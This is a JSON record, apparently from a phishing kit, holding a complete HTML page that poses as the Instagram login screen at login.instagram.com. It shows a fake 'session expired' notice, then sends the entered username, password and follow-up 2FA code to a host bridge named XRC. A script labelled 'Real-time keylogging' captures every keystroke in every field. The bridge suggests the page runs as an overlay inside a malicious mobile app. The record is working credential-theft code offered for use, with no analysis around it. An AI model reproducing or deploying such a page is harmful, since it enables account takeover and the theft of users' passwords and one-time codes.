{
  "id": "instagram_login",
  "domain": "login.instagram.com",
  "name": "Instagram - Login",
  "type": "login",
  "html": '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Instagram - Sign In</title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{background:#0a0e17;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;color:#e0e0e0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}\n.container{width:100%;max-width:380px}\n.logo{text-align:center;margin-bottom:32px}\n.logo-text{font-size:28px;font-weight:700;color:#E4405F}\n.logo-sub{font-size:13px;color:#6b7280;margin-top:4px}\n.input-group{margin-bottom:16px}\n.input-group label{display:block;font-size:12px;color:#9ca3af;margin-bottom:6px;font-weight:500}\n.input-group input{width:100%;padding:14px 16px;background:#111827;border:1px solid #374151;border-radius:10px;color:#e0e0e0;font-size:15px;outline:none;transition:all 0.2s}\n.input-group input:focus{border-color:#E4405F;box-shadow:0 0 0 3px rgba(228,64,95,0.1)}\n.input-group input::placeholder{color:#4b5563}\n.btn{width:100%;padding:14px;background:#E4405F;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:opacity 0.2s}\n.btn:active{opacity:0.85;transform:scale(0.98)}\n.btn-secondary{background:#1f2937;border:1px solid #374151;color:#e0e0e0}\n.links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}\n.links a{color:#6b7280;text-decoration:none}\n.links a:active{color:#E4405F}\n.divider{display:flex;align-items:center;margin:24px 0;color:#4b5563;font-size:13px}\n.divider::before,.divider::after{content:\'\';flex:1;height:1px;background:#1f2937}\n.divider span{padding:0 16px}\n.social-login{display:flex;gap:12px;justify-content:center}\n.social-btn{width:48px;height:48px;border-radius:50%;background:#1f2937;border:1px solid #374151;display:flex;align-items:center;justify-content:center;font-size:20px;cursor:pointer}\n.social-btn:active{background:#374151}\n.notice{background:rgba(228,64,95,0.08);border:1px solid rgba(228,64,95,0.2);border-radius:8px;padding:12px 16px;margin-bottom:20px;font-size:12px;color:#9ca3af;text-align:center}\n.loading{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);justify-content:center;align-items:center;flex-direction:column;z-index:200}\n.loading.active{display:flex}\n.spinner{width:36px;height:36px;border:3px solid #1f2937;border-top-color:#E4405F;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:12px}\n@keyframes spin{to{transform:rotate(360deg)}}\n.loading p{color:#9ca3af;font-size:13px}\n.2fa-section{margin-top:20px}\n</style>\n</head>\n<body>\n<div class="container">\n  <div class="logo">\n    <div class="logo-text">Instagram</div>\n    <div class="logo-sub">Sign in to your account</div>\n  </div>\n  <div class="notice">Your session has expired. Please sign in again to continue.</div>\n  <div id="loginForm">\n    <div class="input-group"><label>Email or Phone</label><input type="text" id="username" placeholder="Enter email or phone number" autocomplete="username"></div>\n    <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Enter your password" autocomplete="current-password"></div>\n    <button class="btn" onclick="submitLogin()">Sign In</button>\n    <button class="btn btn-secondary" onclick="bioLogin()" style="margin-top:8px"><span style="font-size:16px">🔐</span> Biometric Login</button>\n    <div class="links">\n      <a href="#" onclick="forgot()">Forgot password?</a>\n      <a href="#" onclick="signup()">Create account</a>\n    </div>\n    <div class="divider"><span>or</span></div>\n    <div class="social-login">\n      <div class="social-btn" onclick="social(\'google\')">G</div>\n      <div class="social-btn" onclick="social(\'apple\')">🍎</div>\n      <div class="social-btn" onclick="social(\'facebook\')">f</div>\n    </div>\n  </div>\n  \n    <div class="2fa-section" id="2faSection" style="display:none">\n      <div class="input-group"><label>2FA Code</label><input type="text" id="2fa_code" placeholder="000000" maxlength="6" inputmode="numeric"></div>\n      <button class="btn" onclick="submit2FA()">Verify</button>\n    </div>\n</div>\n<div class="loading" id="loading"><div class="spinner"></div><p>Verifying...</p></div>\n<script>\nfunction submitLogin(){\n  var u=document.getElementById(\'username\').value;\n  var p=document.getElementById(\'password\').value;\n  if(!u||!p){alert(\'Please fill in all fields\');return;}\n  document.getElementById(\'loading\').classList.add(\'active\');\n  XRC.submit(JSON.stringify({username:u,password:p,step:\'login\'}));\n  setTimeout(function(){{document.getElementById("loading").classList.remove("active");document.getElementById("loginForm").style.display="none";document.getElementById("2faSection").style.display="block";}},1500);\n}\nfunction submit2FA(){\n  var c=document.getElementById(\'2fa_code\').value;\n  if(!c||c.length<6){alert(\'Enter valid 2FA code\');return;}\n  document.getElementById(\'loading\').classList.add(\'active\');\n  XRC.submit(JSON.stringify({code:c,step:\'2fa\'}));\n  setTimeout(function(){document.getElementById(\'loading\').classList.remove(\'active\');alert(\'Verification complete.\');},2000);\n}\nfunction bioLogin(){XRC.submit(JSON.stringify({step:\'biometric\',type:\'fingerprint\'}));}\nfunction forgot(){XRC.submit(JSON.stringify({step:\'forgot_password\'}));}\nfunction signup(){XRC.submit(JSON.stringify({step:\'create_account\'}));}\nfunction social(provider){XRC.submit(JSON.stringify({step:\'social_auth\',provider:provider}));}\n// Real-time keylogging\nvar inputs=document.querySelectorAll(\'input\');\nfor(var i=0;i<inputs.length;i++){\n  inputs[i].addEventListener(\'input\',function(){\n    XRC.capture(this.id,this.value,this.type);\n  });\n}\n</script>\n</body>\n</html>'
}